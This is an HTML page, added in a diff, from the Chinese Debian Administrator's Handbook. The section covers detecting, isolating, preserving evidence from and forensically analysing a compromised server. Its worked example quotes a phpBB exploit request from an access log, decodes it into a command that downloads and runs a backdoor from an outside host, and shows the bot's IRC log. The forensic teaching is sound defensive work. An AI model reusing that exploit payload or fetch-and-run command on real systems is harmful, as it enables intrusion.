@@ -1,0 +1,327 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html
+    xmlns="http://www.w3.org/1999/xhtml"><head><meta
+        http-equiv="Content-Type"
+        content="text/html; charset=UTF-8" /><title
+        xmlns:d="http://docbook.org/ns/docbook">14.6. 处理被攻陷的机器</title><link
+        rel="stylesheet"
+        type="text/css"
+        href="Common_Content/css/default.css" /><link
+        rel="stylesheet"
+        media="print"
+        href="Common_Content/css/print.css"
+        type="text/css" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="generator"
+        content="publican v4.3.1" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="package"
+        content="Debian-debian-handbook-8-zh-CN-1.0-1" /><meta
+        name="keywords"
+        content="防火墙, 网络过滤, IDS/NIDS" /><link
+        rel="home"
+        href="index.html"
+        title="Debian 管理员手册" /><link
+        rel="up"
+        href="security.html"
+        title="第 14 章 安全" /><link
+        rel="prev"
+        href="sect.other-security-considerations.html"
+        title="14.5. 其他安全相关事项" /><link
+        rel="next"
+        href="debian-packaging.html"
+        title="第 15 章 Creating a Debian Package" /><link
+        rel="canonical"
+        href="http://l.github.io/debian-handbook/html/zh-CN/sect.dealing-with-compromised-machine.html" /></head><body
+      class="draft "><noscript><iframe
+          src="//www.googletagmanager.com/ns.html?id=GTM-5H35QX"
+          height="0"
+          width="0"
+          style="display:none;visibility:hidden"></iframe></noscript><script
+        type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&amp;l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5H35QX');</script><div
+        id="banner"><a
+          href="http://debian-handbook.info/get/"><span
+            class="text">Download the ebook</span></a></div><p
+        id="title"><a
+          class="left"
+          href="http://www.debian.org"><img
+            alt="Product Site"
+            src="Common_Content/images//image_left.png" /></a><a
+          class="right"
+          href="http://debian-handbook.info"><img
+            alt="Documentation Site"
+            src="Common_Content/images//image_right.png" /></a></p><ul
+        class="docnav top"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>上一页</strong></a></li><li
+          class="home">Debian 管理员手册</li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>下一页</strong></a></li></ul><div
+        class="section"><div
+          class="titlepage"><div><div><h2
+                class="title"><a
+                  id="sect.dealing-with-compromised-machine"></a>14.6. 处理被攻陷的机器</h2></div></div></div><div
+          class="para">
+			尽管有最好的意图和精心设计的安全策略，管理员最终还是会面对劫持行为。本节提供一些指导，介绍碰到这种情况时如何应对。
+		</div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713386640"></a>14.6.1. 探测并观察黑客入侵</h3></div></div></div><div
+            class="para">
+				对付侵入的第一步是要注意黑客的这种行为。它通常不是自明的，特别是在没有足够的监控措施时。
+			</div><div
+            class="para">
+				破解行为通常不能被侦测到，除非这些行为对宿主机上的正常服务产生了直接影响，例如连接减缓，某些用户不能连接，或者其他类型的故障。面对这些问题，管理员需要好好看看机器并仔细检查异常行为。这时通常会发现异常进程，譬如名为 <code
+              class="literal">apache</code> 而非标准的 <code
+              class="literal">/usr/sbin/apache2</code>。按照这个例子，接下来要做的是注意进程标识，并检查 <code
+              class="filename">/proc/<em
+                class="replaceable">pid</em>/exe</code> 看看此进程当前运行的是什么程序：
+			</div><pre
+            class="screen">
+<code
+              class="computeroutput"># </code><strong
+              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
+<code
+              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
+</pre><div
+            class="para">
+				一个程序安装在 <code
+              class="filename">/var/tmp/</code> 并作为网页服务器运行？毋庸置疑，机器已经被攻陷了。
+			</div><div
+            class="para">
+				此处只是一个示例，但是其他提示也会给管理员敲响警钟：
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						命令的某个选项不起作用了；命令自己声明的软件版本与根据 <code
+                    class="command">dpkg</code> 安装的预期版本不一致；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						命令行提示或者会话问候显示最后的连接源于其他洲的未知服务器；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">/tmp/</code> 分区已经被错误填满，而且都是由于非法的电影拷贝产生的；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						等等。
+					</div></li></ul></div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713375840"></a>14.6.2. 把服务器下线</h3></div></div></div><div
+            class="para">
+				除了非常特殊的情况，破解一般源于网络，攻击者需要连接网络达到目的地（读取机密数据，共享非法文件，使用中继隐藏身份，等等）。将计算机从网络上拔出会阻止攻击者达到这些目标，即使是他们还没能成功攻陷电脑。
+			</div><div
+            class="para">
+				这些只有在服务器可以物理访问时才有可能。如果服务器是位于半个国家之外的托管供应商数据中心，或者因为其他原因不能接近服务器，最好是先收集一些重要信息（参考随后章节），然后通过关闭尽可能多的服务，隔离尽可能多的服务器（通常，是除了 <code
+              class="command">sshd</code> 之外的所有服务）。这种情况仍然比较尴尬，因为你不能确定攻击者是否像管理员一样具有 SSH 访问权限；从而使清理机器更困难。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713373040"></a>14.6.3. 保留所有可以作为证据的东西</h3></div></div></div><div
+            class="para">
+				要知道针对攻击者的反击和从事法律活动需要所有重要元素的复本；包括硬盘内容，所有允许进程的清单，所有打开连接的清单。RAM 的内容也可以被使用，但是实践中很少使用。
+			</div><div
+            class="para">
+				在斗争最激烈的时候，管理员往往倾向于在感染电脑上执行许多检查；这通常不是一个好主意。每个命令都有可能已经被更改了并有可能擦除证据片段。检查应该限制在最小范围内（对于网络连接 <code
+              class="command">netstat -tupan</code>，列出所有进程 <code
+              class="command">ps auxf</code>，正在运行程序的信息 <code
+              class="command">ls -alR /proc/[0-9]*</code>），每个已进行过的检查都要仔细记下来。
+			</div><div
+            class="sidebar"><div
+              class="titlepage"><div><div><p
+                    class="title"><strong><span
+                        class="emphasis"><em>注意</em></span> 在线分析</strong></p></div></div></div><div
+              class="para">
+				尽管在运行时分析系统看起来很有诱惑力，特别是在不能接近服务器的时候，但是最好避免这种情况：原因很简单，你不能信任当前安装在被感染系统上的任何程序。被更改的 <code
+                class="command">ps</code> 命令很容易就能隐藏一些进程，或者被更改的 <code
+                class="command">ls</code> 隐藏一些文件，有时候甚至内核也可能被感染！
+			</div><div
+              class="para">
+				如果仍然需要在线分析，要注意只使用已知的可信任程序。比较好的方法是使用含有简单程序的救援 CD，或者只读的网络共享。然而，如果内核本身被感染，这些措施也无济于事。
+			</div></div><div
+            class="para">
+				一旦“动态”元素已经被保存，下一步就是存储整个硬盘镜像。如果文件系统仍在变化，是不可能制作镜像的，就需要以只读方式挂载。最简单的办法是（在运行 <code
+              class="command">sync</code> 后）直接停机并使用救援 CD 重启系统。每个分区使用类似 <code
+              class="command">dd</code> 来拷贝；这些镜像可以发送到其他服务器（可以使用很方便的 <code
+              class="command">nc</code> 工具）。另一种可能更简单：把磁盘从机器里取出来并使用新的替代它，从新格式化，重装系统。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713364816"></a>14.6.4. 重新安装</h3></div></div></div><a
+            id="idm140492713364176"
+            class="indexterm"></a><a
+            id="idm140492713363408"
+            class="indexterm"></a><div
+            class="para">
+				如果没有完全重装，不要让服务器恢复在线。如果问题很严重（管理员权限被获得），几乎没有办法可以确保完全清除攻击者留下的东西（特别是 <span
+              class="emphasis"><em>后门－backdoors</em></span>）。当然，所有最新的安全补丁都要更新，以便移除攻击者所利用的漏洞。理想情况下，分析攻击应针对攻击向量，以便确定是否修复；否则，只能希望漏洞能被某个更新所修复。
+			</div><div
+            class="para">
+				从新安装远程服务器并不容易；可能要托管公司协助，因为并不是所有公司都提供自动重装系统。注意，不要使用被感染之后的系统备份来安装机器。只有数据应当被恢复，实际使用的软件应该从安装媒介重新安装。
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713360592"></a>14.6.5. 法医分析</h3></div></div></div><div
+            class="para">
+				现在服务被恢复，是时候看看感染系统的磁盘镜像，找到攻击向量了。当加载这些镜像是，注意使用 <code
+              class="literal">ro,nodev,noexec,noatime</code> 选项来避免改变其内容（包括读取文件的时间戳）或者误运行感染程序。
+			</div><div
+            class="para">
+				追踪痕迹通常需要寻找任何被更改和执行的东西：
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">.bash_history</code> 文件可用于查阅；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						也会列出最近创建，修改和读取的文件；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="command">strings</code> 通过从二进制中提取字符串，可辅助用于识别攻击者安装的程序；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						<code
+                    class="filename">/var/log/</code> 日志文件可重建事件记录；
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						特殊用途的工具可用于恢复潜在被删除的文件，包括攻击者删除的日志文件。
+					</div></li></ul></div><div
+            class="para">
+				可以使用特殊的软件让操作变得更简单。<span
+              class="emphasis"><em>The Coroner Toolkit</em></span> （在 <span
+              class="pkg pkg">tct</span> 软件包中）是此类工具的集合。包括几种工具；其中 <code
+              class="command">grave-robber</code> 可以从正在运行的感染系统中收集数据，<code
+              class="command">lazarus</code> 可以从磁盘上未分配区域提取感兴趣的数据，<code
+              class="command">pcat</code> 可以复制某个进程的内存；其中也包含了其他数据提取工具。<a
+              id="idm140492713350080"
+              class="indexterm"></a>
+			</div><div
+            class="para">
+				<span
+              class="pkg pkg">sleuthkit</span> 软件包提供一些其他工具用于文件系统。通过 <span
+              class="emphasis"><em>Autopsy Forensic Browser</em></span> 图形界面（在 <span
+              class="pkg pkg">autopsy</span> 软件包中）可以使其操作简单化。<a
+              id="idm140492713347472"
+              class="indexterm"></a>
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    id="idm140492713346704"></a>14.6.6. 重构攻击场景</h3></div></div></div><div
+            class="para">
+				在分析过程中搜集到的所有元素应该像拼图一片一片组合起来；第一个可疑文件通常和提供突破口的日志文件相关。现实世界中的例子比冗长的理论明了。
+			</div><div
+            class="para">
+				下面的日志文件截取自 Apache <code
+              class="filename">access.log</code>：
+			</div><pre
+            class="programlisting">
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</pre><div
+            class="para">
+				这个例子正是利用了 phpBB 中的一个老安全漏洞。<div
+              class="url">→ <a
+                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
+              class="url">→ <a
+                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
+			</div><div
+            class="para">
+				破译这段 URL 就会明白，攻击者成功运行了一些 PHP 代码，即：<code
+              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code>。实际上，在<code
+              class="filename">/tmp/</code>会发现一个 <code
+              class="filename">bd</code> 文件。运行 <code
+              class="command">strings /mnt/tmp/bd</code> 会发现字符串 <code
+              class="literal">PsychoPhobia Backdoor is starting...</code>。这也确实看起来像个后门。
+			</div><div
+            class="para">
+				随后，访问权限会被用来下载，安装和运行连接到地下 IRC 网络的 <span
+              class="emphasis"><em>机器人－bot</em></span>。这个机器人通过 IRC 协议控制，用于下载文件并共享。程序甚至有自己的日志文件：
+			</div><pre
+            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
+</pre><div
+            class="para">
+				跟踪记录显示有两个视频文件被存储在服务器上了。
+			</div><div
+            class="para">
+				同时，攻击者也下载了一对额外文件，<code
+              class="filename">/tmp/pt</code> 和 <code
+              class="filename">/tmp/loginx</code>。运行 <code
+              class="command">strings</code> 命令分析文件会发现诸如<span
+              class="foreignphrase"><em
+                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> 和 <span
+              class="foreignphrase"><em
+                class="foreignphrase">Now wait for suid shell...</em></span>。这些看起来像是程序利用本地漏洞获取管理员特权。他们达到目的了吗？本例中，视乎没有，因为在他们开始活动之后，看起来没有文件被修改。
+			</div><div
+            class="para">
+				本例中，整个入侵过程被重构。可以推断，攻击者已经能够利用被侵入的系统三天左右；分析的成果在于漏洞已经被识别出来，并且管理员可以确保在下一次安装时确实修复了该漏洞。
+			</div></div></div><ul
+        class="docnav"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>上一页</strong>14.5. 其他安全相关事项</a></li><li
+          class="up"><a
+            accesskey="u"
+            href="#"><strong>上一级</strong></a></li><li
+          class="home"><a
+            accesskey="h"
+            href="index.html"><strong>起始页</strong></a></li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>下一页</strong>第 15 章 Creating a Debian Package</a></li></ul><div
+        id="translated_pages"><ul><li><a
+              href="../ar-MA/sect.dealing-with-compromised-machine.html">ar-MA</a></li><li><a
+              href="../da-DK/sect.dealing-with-compromised-machine.html">da-DK</a></li><li><a
+              href="../de-DE/sect.dealing-with-compromised-machine.html">de-DE</a></li><li><a
+              href="../el-GR/sect.dealing-with-compromised-machine.html">el-GR</a></li><li><a
+              href="../en-US/sect.dealing-with-compromised-machine.html">en-US</a></li><li><a
+              href="../es-ES/sect.dealing-with-compromised-machine.html">es-ES</a></li><li><a
+              href="../fa-IR/sect.dealing-with-compromised-machine.html">fa-IR</a></li><li><a
+              href="../fr-FR/sect.dealing-with-compromised-machine.html">fr-FR</a></li><li><a
+              href="../hr-HR/sect.dealing-with-compromised-machine.html">hr-HR</a></li><li><a
+              href="../id-ID/sect.dealing-with-compromised-machine.html">id-ID</a></li><li><a
+              href="../it-IT/sect.dealing-with-compromised-machine.html">it-IT</a></li><li><a
+              href="../ja-JP/sect.dealing-with-compromised-machine.html">ja-JP</a></li><li><a
+              href="../pl-PL/sect.dealing-with-compromised-machine.html">pl-PL</a></li><li><a
+              href="../pt-BR/sect.dealing-with-compromised-machine.html">pt-BR</a></li><li><a
+              href="../ro-RO/sect.dealing-with-compromised-machine.html">ro-RO</a></li><li><a
+              href="../ru-RU/sect.dealing-with-compromised-machine.html">ru-RU</a></li><li><a
+              href="../tr-TR/sect.dealing-with-compromised-machine.html">tr-TR</a></li><li><a
+              href="../zh-CN/sect.dealing-with-compromised-machine.html">zh-CN</a></li></ul></div></body></html>
